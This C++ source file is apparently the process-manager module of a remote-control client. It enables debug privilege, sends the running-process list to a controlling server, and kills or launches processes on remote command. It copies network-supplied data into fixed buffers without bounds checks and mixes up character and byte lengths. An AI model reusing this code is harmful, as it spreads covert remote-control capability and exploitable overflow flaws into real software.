#include "pch.h"
#include "ProcessManager.h"
#include "ProcessHelper.h"



CProcessManager::CProcessManager(CIocpClient* IocpClient) :CManager(IocpClient)
{
	//回传数据包到服务器

	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

	//当前客户端扫描所有正在运行的进程信息

	SendClientProcessList();



}
CProcessManager::~CProcessManager()
{
	_tprintf(_T("~CProcessManager()\r\n"));
	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

void CProcessManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
		case CLIENT_PROCESS_MANAGER_REFRESH_REQUIRE:
		{

		SendClientProcessList();

		break;
		}
		case CLIENT_PROCESS_MANAGER_KILL_REQUIRE:
		{

			//SeCreateProcess1((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));

			//SeCreateProcess6((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
			KillProcess((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));

			break;
		}
		case CLIENT_PROCESS_MANAGER_CREATE_REQUIRE:
		{
			//SeCreateProcess1((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
			XkCreateProcess((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
		}
	}
}
void CProcessManager::XkCreateProcess(PBYTE bufferData, ULONG_PTR BufferLength)
{
	EnableSeDebugPrivilege(GetCurrentProcess(),TRUE,SE_DEBUG_NAME);

	XkOpenProcess(bufferData, BufferLength);

	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

void CProcessManager::XkOpenProcess(PBYTE bufferData, ULONG_PTR BufferLength)
{

	TCHAR ApplicationName[MAX_PATH];
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	BOOL IsOk = FALSE;
	ZeroMemory(ApplicationName, MAX_PATH);
	//传入的应用名需要带后缀.exe
	memcpy(ApplicationName, bufferData, BufferLength);
	//const TCHAR* PATH= _T("C:\\Windows\\System32\\");
	//// 连接 PATH 和 ApplicationName
	//TCHAR FullPath[MAX_PATH];
	//ZeroMemory(FullPath, MAX_PATH);
	//_tcscpy_s(FullPath, _tcslen(PATH) + 1, PATH);
	//_tcscat_s(FullPath, MAX_PATH, ApplicationName);
	const TCHAR* PATH = _T("C:\\Windows\\System32\\");

	// 连接 PATH 和 ApplicationName
	TCHAR FullPath[MAX_PATH];
	//_tcscpy_s(FullPath, _tcslen(PATH) + 1, PATH);
	memcpy(FullPath, PATH, _tcslen(PATH) + 1);
	_tcscat_s(FullPath, MAX_PATH, ApplicationName);

		
	//清空结构体的内存
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	StartupInfo.cb = sizeof(STARTUPINFO);
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	//创建子进程
	IsOk = CreateProcess(FullPath, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo);
	DWORD LastError = GetLastError();
	if (!IsOk)
	{
		_tprintf(_T("CreateProcess failed\n"));
		return;
	}
	//等待直到子进程退出
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

	// 关闭进程和线程句柄
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
}

BOOL CProcessManager::SendClientProcessList()
{

		BOOL  IsOk = FALSE;
		DWORD Offset = 1;
		DWORD v1 = 0;
		ULONG ItemCount = 0;
		char* BufferData = NULL;
		vector<PROCESS_INFORMATION_ITEM> ProcessItemInfoVector;
		vector<PROCESS_INFORMATION_ITEM>::iterator i;
		if (EnumProcessByToolHelp32(ProcessItemInfoVector) == FALSE)
		{
			return IsOk;
		}
		BufferData = (char*)LocalAlloc(LPTR, 0x1000);
		if (BufferData == NULL)
		{
			goto Exit;
		}
		BufferData[0] = CLIENT_PROCESS_MANAGER_REPLY;

		//遍历模板数据
		//[CLIENT_PROCESS_MANAGER_REPLY][ProcessID][ProcessImageName\0][ProcessFullPath\0][位数\0][ProcessID]......
		for (i = ProcessItemInfoVector.begin(); i != ProcessItemInfoVector.end(); i++)
		{
			v1 = sizeof(HANDLE) +
				lstrlen(i->ProcessImageName) + lstrlen(i->ProcessFullPath) + lstrlen(i->isWow64Process) + 3;
			// 缓冲区太小，再重新分配下
			if (LocalSize(BufferData) < (Offset + v1))
			{
				BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1),
					LMEM_ZEROINIT | LMEM_MOVEABLE);
			}

			memcpy(BufferData + Offset, &(i->ProcessIdentity), sizeof(HANDLE));
			Offset += sizeof(HANDLE);
			memcpy(BufferData + Offset, i->ProcessImageName, lstrlen(i->ProcessImageName) + 1);
			Offset += lstrlen(i->ProcessImageName) + 1;
			memcpy(BufferData + Offset, i->ProcessFullPath, lstrlen(i->ProcessFullPath) + 1);
			Offset += lstrlen(i->ProcessFullPath) + 1;
			memcpy(BufferData + Offset, i->isWow64Process, lstrlen(i->isWow64Process) + 1);
			Offset += lstrlen(i->isWow64Process) + 1;
		}
		m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
		IsOk = TRUE;
	Exit:
		if (BufferData != NULL)
		{
			LocalFree(BufferData);
			BufferData = NULL;
		}
	return IsOk;
}




